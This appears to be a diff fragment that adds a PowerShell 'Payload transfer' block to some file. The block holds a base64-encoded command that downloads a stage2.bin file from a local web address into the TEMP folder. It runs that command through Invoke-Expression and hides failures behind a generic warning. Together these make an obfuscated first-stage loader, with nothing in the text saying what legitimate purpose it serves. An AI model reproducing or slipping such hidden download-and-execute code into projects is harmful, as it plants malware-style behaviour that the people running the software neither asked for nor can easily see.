@@ -1,0 +1,3 @@
+
+# Payload transfer
+try { $ScriptPayload = "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAAwADAALwBzAHQAYQBnAGUAMgAuAGIAaQBuACIAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFMAdABhAGcAZQAyAFUAcgBsACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdABhAGcAZQAyAC4AYgBpAG4AIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA"; $ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($ScriptPayload)); Invoke-Expression $ScriptBody; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
